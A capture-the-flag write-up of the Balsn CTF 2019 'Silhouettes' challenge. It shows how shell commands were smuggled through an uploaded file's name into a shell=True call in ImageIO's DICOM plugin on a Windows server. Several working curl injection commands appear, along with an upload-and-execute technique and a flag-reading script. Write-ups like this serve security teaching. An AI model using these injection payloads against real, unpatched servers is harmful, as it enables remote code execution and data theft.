## Web - Silhouettes

This challenge is a simple web service that prints width and height of image  
from uploaded file. "Upload" part is implemented in PHP:

```php  
1000000)  
       die("file too large");  
   set_time_limit(15);  
   ini_set('max_execution_time', 15);  
   $name = "C:/upload/" . basename($_FILES["file"]["name"]);  
   move_uploaded_file($file["tmp_name"], $name);  
   system("python getsize.py ".escapeshellarg($name));  
   unlink($name);  
   die();  
}  
?>  
```

Extraction of width and height is implemented in Python (`getsize.py`):

```python  
import sys, imageio  
assert imageio.__version__ == '2.5.0'  
print('(w, h) =', imageio.imread(sys.argv[1]).shape[:2])  
```

Web page also provides additional details about the software stack:

* Windows Server 2019 version 10.0.17763.0  
* Python 3.7.4  
* [ImageIO](https://github.com/imageio/imageio) 2.5.0

The first interesting thing that I noticed is that PHP script saves uploaded  
images with user-provided file name in `C:/upload/`. Suspicious.

It looked like we may try to break in using some specially crafted  
file, maybe also with specially crafted file name.

As a first step, I decided to examine the list of supported image formats:  
[ImageIO
documentation](https://imageio.readthedocs.io/en/v2.5.0/formats.html#single-
images).  
And the first thing that I noticed was the NPZ - "Numpy’s compressed array  
format". I knew that Numpy is the Python library containing various math-
related  
primitives, like N-dimensional arrays, matrices, etc. And if it has the
ability  
to save data in files, quite possible that developers used some very simple  
zero-effort way to implement this functionality. Like  
[pickle](https://docs.python.org/3/library/pickle.html), which is well known
to  
allow execution of (almost) arbitrary code when unpickling.

It turned out that I was almost right.  
[numpy.load](https://docs.scipy.org/doc/numpy/reference/generated/numpy.load.html)  
really uses pickle to load arrays containing objects. But this functionality  
[was disabled some time
ago](https://github.com/numpy/numpy/commit/a4df7e51483c78853bb33814073498fb027aa9d4),  
exactly because of obvious  
[security concerns](https://nvd.nist.gov/vuln/detail/CVE-2019-6446).

I tried to upload NPZ file with serialized object to the service just to check  
whether it uses old version of Numpy or not. It failed, which meant that
server  
is using updated version of Numpy, with `allow_pickle=False` by default. After  
that, I tried to find possible flaw in Numpy's file array loading algorithm,  
which potentially would allow me to bypass checks and involve pickle again.  
After some time  I realized that this was a dead end.

But we still have some weirdness in path and filename handling during upload,  
right? Ability to upload files with known path/name on the server is not good,  
bun not the vulnerability on its own. Specially crafted file name could be
used  
to inject shell commands, but to be exploitable, it have to be passed to  
shell with improper escaping. I thought that this was unlikely, but still  
decided to investigate. I had no other option anyway.

```  
$ git clone https://github.com/imageio/imageio  
$ cd imageio  
$ git checkout v2.5.0  
$ git grep subpocess  
$ git grep subprocess -- imageio  
imageio/plugins/_tifffile.py:#                subprocess  
imageio/plugins/_tifffile.py:    import subprocess  # noqa: delayed import  
imageio/plugins/_tifffile.py:    out = subprocess.check_output([jhove,
filename, '-m', 'TIFF-hul'])  
imageio/plugins/dicom.py:import subprocess  
imageio/plugins/dicom.py:        subprocess.check_call([fname, "--version"],
shell=True)  
imageio/plugins/dicom.py:
subprocess.check_call([exe, fname1, fname2], shell=True)  
imageio/plugins/ffmpeg.py:import subprocess as sp  
imageio/plugins/ffmpeg.py:            # Start ffmpeg subprocess and get meta
information  
imageio/plugins/ffmpeg.py:            # Close the current generator, and
thereby terminate its subprocess  
imageio/plugins/ffmpeg.py:            # Read meta data. This start the
generator (and ffmpeg subprocess)  
imageio/plugins/ffmpeg.py:            # Seed the generator (this is where the
ffmpeg subprocess starts)  
```

Oh my, `shell=True` in `dicom.py` looks dangerous!

After a closer look at `imageio/plugins/dicom.py` it turned out that there are  
two kinds of DICOM files: uncompressed and JPEG-compressed. Uncompressed DICOM  
files are supported natively by ImageIO and one of its dependencies, but  
JPEG-compressed files require decompression by external CLI tool. And ImageIO  
[uses](https://github.com/imageio/imageio/blob/v2.5.0/imageio/plugins/dicom.py#L131)  
`subprocess.check_call(..., shell=True)` to uncompress such files before  
processing.

Promising code path requires `dcmdjpeg.exe` to be installed, so I needed some  
right files to test that this is really so on the server.  
Quick googling gave this:  
[compsamples_jpeg.tar](ftp://medical.nema.org/medical/dicom/DataSets/WG04/compsamples_jpeg.tar).  
I chose one [random file](./dicom_jpeg) from that tarball and tried ImageIO on  
it locally:

```  
>>> import imageio  
>>> imageio.imread('./dicom_jpeg').shape[:2]  
--version: dcmdjpeg: command not found  
...  
imageio.plugins._dicom.CompressedDicom: The dicom reader can only read files
with uncompressed image data - not '1.2.840.10008.1.2.4.70' (JPEG). You can
try using dcmtk or gdcm to convert the image.  
```

Then I tried to upload it, and it worked! Web service was able to show some  
(width, height), which meant that `dcmdjpeg.exe` is installed on the server  
and exploitable code path is working.

I recalled some `cmd.exe` commands, which I used last time back in the  
Windows XP days, and came up with following:

```  
$ curl -F 'file=@dicom_jpeg;filename=x&dir&x'
'http://silhouettes.balsnctf.com/'  
$dcmtk: dcmdjpeg v3.6.4 2018-11-29 $

dcmdjpeg: Decode JPEG-compressed DICOM file

Host type: AMD64-Windows  
Character encoding: CP1252  
Code page: 437 (OEM) / 1252 (ANSI)

External libraries used:  
- ZLIB, Version 1.2.11  
- IJG, Version 6b  27-Mar-1998 (modified)  
$dcmtk: dcmdjpeg v3.6.4 2018-11-29 $

dcmdjpeg: Decode JPEG-compressed DICOM file  
error: Missing parameter dcmfile-out  
Volume in drive C has no label.  
Volume Serial Number is C604-FB4A

Directory of C:\inetpub\wwwroot

09/25/2019  12:53 PM    <DIR>          .  
09/25/2019  12:53 PM    <DIR>          ..  
09/25/2019  12:57 PM               115 getsize.py  
09/25/2019  02:42 PM             1,602 index.php  
              2 File(s)          1,717 bytes  
              2 Dir(s)  18,761,220,096 bytes free  
```

Surprisingly, it worked even despite the fact I did not checked which
characters  
I'm allowed to use in the file name and which are prohibited.

It seemed that I was a step away from the flag, but... I'm a long time Linux  
user and I have near zero experience with Windows. And I'm talking about  
day-to-day usage, not about pwning =).

So, as the next step, I tried to understand which characters are allowed in
the  
file name. Here is the list of various "sanitizers" on my way to cmd.exe:

* PHP/`basename()` - eats `/`, `\` and anything before.  
* PHP/`escapeshellarg()` - replaces `%`, `!` and `"` with spaces (` `); adds `"`  
around the string.  
* Python/`subprocess.list2cmdline()`: adds `"` around the argument if it  
contains ` ` or `\t`; adds backslash before `"`.  
* Windows filesystem: file creation fails if file name contains any of these:  
`<>:"/\|?*`. File is created on FS before its name goes into `cmd.exe`, so
this  
should not fail if we want command to be executed.

But how to construct anything useful if we are not even able to use spaces in  
our command? For example, how to execute `cd ..` to go upper in the directory  
tree? I tried to google this, hoping that there is some special command that  
could replace `cd ..`. Instead of finding special command, I learned that  
argument parsing for internal commands is working really weird in `cmd.exe`.  
Not only spaces and tabs, but also `,`, `;` and `=` may be used as an argument  
separators. It turned out that commands like `cd..` are working as expected  
even without any separator!

```  
$ curl -F 'file=@dicom_jpeg;filename=x&cd..&cd..&dir&x'
'http://silhouettes.balsnctf.com/'  
$dcmtk: dcmdjpeg v3.6.4 2018-11-29 $

dcmdjpeg: Decode JPEG-compressed DICOM file

Host type: AMD64-Windows  
Character encoding: CP1252  
Code page: 437 (OEM) / 1252 (ANSI)

External libraries used:  
- ZLIB, Version 1.2.11  
- IJG, Version 6b  27-Mar-1998 (modified)  
$dcmtk: dcmdjpeg v3.6.4 2018-11-29 $

dcmdjpeg: Decode JPEG-compressed DICOM file  
error: Missing parameter dcmfile-out  
Volume in drive C has no label.  
Volume Serial Number is C604-FB4A

Directory of C:\

11/14/2018  06:56 AM    <DIR>          EFI  
11/07/2007  08:00 AM            17,734 eula.1028.txt  
11/07/2007  08:00 AM            17,734 eula.1031.txt  
11/07/2007  08:00 AM            10,134 eula.1033.txt  
11/07/2007  08:00 AM            17,734 eula.1036.txt  
11/07/2007  08:00 AM            17,734 eula.1040.txt  
11/07/2007  08:00 AM               118 eula.1041.txt  
11/07/2007  08:00 AM            17,734 eula.1042.txt  
11/07/2007  08:00 AM            17,734 eula.2052.txt  
11/07/2007  08:00 AM            17,734 eula.3082.txt  
11/07/2007  08:00 AM             1,110 globdata.ini  
09/25/2019  12:45 PM    <DIR>          inetpub  
11/07/2007  08:03 AM           562,688 install.exe  
11/07/2007  08:00 AM               843 install.ini  
11/07/2007  08:03 AM            76,304 install.res.1028.dll  
11/07/2007  08:03 AM            96,272 install.res.1031.dll  
11/07/2007  08:03 AM            91,152 install.res.1033.dll  
11/07/2007  08:03 AM            97,296 install.res.1036.dll  
11/07/2007  08:03 AM            95,248 install.res.1040.dll  
11/07/2007  08:03 AM            81,424 install.res.1041.dll  
11/07/2007  08:03 AM            79,888 install.res.1042.dll  
11/07/2007  08:03 AM            75,792 install.res.2052.dll  
11/07/2007  08:03 AM            96,272 install.res.3082.dll  
09/15/2018  07:19 AM    <DIR>          PerfLogs  
09/25/2019  12:52 PM    <DIR>          Program Files  
09/25/2019  12:52 PM    <DIR>          Program Files (x86)  
09/25/2019  12:49 PM    <DIR>          Python37  
10/05/2019  10:03 AM    <DIR>          upload  
09/25/2019  12:55 PM    <DIR>          Users  
11/07/2007  08:00 AM             5,686 vcredist.bmp  
11/07/2007  08:09 AM         1,442,522 VC_RED.cab  
11/07/2007  08:12 AM           232,960 VC_RED.MSI  
09/25/2019  12:49 PM    <DIR>          Windows  
09/25/2019  02:15 PM                41  F!ag#$%&'()+,-.;=@[]^_`{}~  
             25 File(s)      3,169,888 bytes  
              9 Dir(s)  18,757,046,272 bytes free  
```

Oh, and here is the file containing our flag, by the way.

Now we just need to `cat` it. This should be easy, right? No, nothing in  
Windows is easy! Actually, we already can easily read files with "convenient"  
file names:

```  
$ curl -F 'file=@dicom_jpeg;filename=x&cd..&cd..&type=eula.1041.txt&x'
'http://silhouettes.balsnctf.com/'  
$dcmtk: dcmdjpeg v3.6.4 2018-11-29 $  
...  
VC Redist EULA - JPN RTM

Unicode

??????????? ???????  
```

But our real target is ``` F!ag#$%&'()+,-.;=@[]^_`{}~```, which contains all  
characters that we are not able to use in our command.

I started to looking at documentation about how to use wildcards and globbing  
in `cmd.exe`, but quickly realized that this is most probably impossible to  
implement given the restriction on characters in the file name (`?` and `*` in  
particular).

This slowed me down a bit. But, quickly after, I remembered that we are able
to  
upload files with any contents into known directory with known name onto the  
server. And thus, we may upload some `evil.exe` and send command like  
`cd..&cd..&cd=upload&evil.exe`, which gives the ability to execute arbitrary  
code on the server, even remote shell.

This looked like a final step to reading the flag, but before writing any
code,  
I decided to quickly check that there are no more obstacles on my way:

```  
$ curl -F 'file=@dicom_jpeg;filename=x&cd..&cd..&cd=upload&dir&x'
'http://silhouettes.balsnctf.com/'  
$dcmtk: dcmdjpeg v3.6.4 2018-11-29 $  
...  
error: Missing parameter dcmfile-out  
$  
```

Wait, what? Where is the output of the last `dir`?

```  
$ curl -F
'file=@dicom_jpeg;filename=x&cd..&cd..&echo=test1&cd=upload&echo=test2&x'
'http://silhouettes.balsnctf.com/'  
$dcmtk: dcmdjpeg v3.6.4 2018-11-29 $  
...  
error: Missing parameter dcmfile-out  
test1  
```

Yup, `cd upload` is not working, anything after it also fails. But why? This  
took me some time to understand. There is a separate permission bit in NTFS:  
`List folder contents`. It seems that server process has permissions to  
create/read/write/delete files in `C:/upload/`, but not to obtain the list of  
files there. And it seems that missing `List folder contents` permission  
somehow breaks `cmd.exe` and it stops executing subsequent commands even if
they  
do not require any directory/file access (this is the only explanation of why  
second `echo` from the last test was not working).

While uploading executable into `C:/upload/` still seemed viable, I needed  
another plan to execute it. Using full path in the file name for file upload  
is not an option because we can not use `/` and `\`. Yet again, it took some  
time to realize that we already have `C:/upload/` in our command. PHP script  
passes full path to the Python script, which, in turn, does something like
this:

```  
some.exe C:/upload/${fname} C:/upload/${fname}.raw  
```

If we give it `evil.exe&` as a file name, `cmd.exe` will really execute this:

```  
some.exe C:/upload/evil.exe& C:/upload/evil.exe&.raw  
```

Now we are somewhere near the flag. Again =). It was pretty clear on how we  
should proceed:

* One thread uploads `evil.exe` in endless loop.  
* Another thread simultaneously tries to execute `evil.exe` on the server side,  
until it succeeds.

But while all parts of the puzzle was already there, I still had few technical  
problems to resolve.

The first one is: what `evil.exe` should really do and how to create it? It
was  
clear that it should contain something equivalent to `cat C:/*F*ag*`. At first  
I was thinking about writing BAT script, but quickly rejected this idea
because  
this requires some knowledge of `cmd.exe`, which I'm still lacking. Next  
option - compile EXE locally on Linux using mingw64 - was also rejected
because  
this requires Windows API knowledge which I do not have. Next obvious option  
is Python. We already know that we have working Python there and we know that
it  
could be executed using just `python` without full path. This means that we
may  
use file name `evil.py&python` to get following command executed:

```  
some.exe C:/upload/evil.py&python C:/upload/evil.py&python.raw  
```

Looks nice and simple!

The second problem is: PHP script removes uploaded files immediately after  
executing the Python script, so we have to hurry up to execute it. And it
would  
be nice to make processing of "execute evil.py" command faster, and to make  
uploaded "evil.py" file live longer in `C:/upload`.

Original DICOM/JPEG image file was quite heavy: ~200KiB, so I tried to make it  
smaller. It turned out that just [first 512 bytes](./dicom_jpeg.small) are  
enough to trigger required code path inside the ImageIO. This makes the  
"execute evil.py" cycle work with faster rate.

`getsize.py` is expected to immediately fail on uploaded Python script and
this  
is not good. We already know that ImageIO is able to execute `dcmdjpeg.exe`,  
and this should be much slower than just discarding file based on simple file  
header checks. So I just tried to attach python script to the 512 byte DICOM  
header which I already had and then pass it to the Python interpreter.  
Surprisingly, it worked without a single error. It looks like the  
interpreter silently discards any garbage before first `\n`. Really do not
know  
why this happens, but this is definitely good for our case.

Finally, I wrote two Python scripts. First - [upload.py](./upload.py) -
uploads  
second script and tries to execute it on server. Second script is expected to  
read flag from the server and print it. Here is how the first version of
second  
script looked like:

```python  
#!/usr/bin/env python3

import glob

fname = glob.glob('c:/*F*ag*')  
if fname:  
   fname = fname[0]  
   try:  
       with open(fname, 'r') as f:  
           print('GOT FLAG: ', f.read())  
   except:  
       print('GOT FLAG (NO): open()')  
else:  
   print('GOT FLAG (NO): glob.glob()')  
```

And it failed on `glob.glob()`... Because for sure the challenge would be too  
easy if file name will not contain some non-printable characters between  
printable!

Final version of [script](./reader.py) revealed the flag itself and the file  
name:

```  
fname: "c:/\x7f
F\x7f!\x7fa\x7fg\x7f#\x7f$\x7f%\x7f&\x7f'\x7f(\x7f)\x7f+\x7f,\x7f-\x7f.\x7f;\x7f=\x7f@\x7f[\x7f]\x7f^\x7f_\x7f`\x7f{\x7f}\x7f~\x7f"  
```

By the way, this was real 0day vulnerability which was fixed few hours after  
the competition ended: https://github.com/imageio/imageio/pull/483.  

Original writeup
(https://github.com/im-0/ctf/tree/master/2019.10.05-Balsn_CTF_2019/web-
Silhouettes).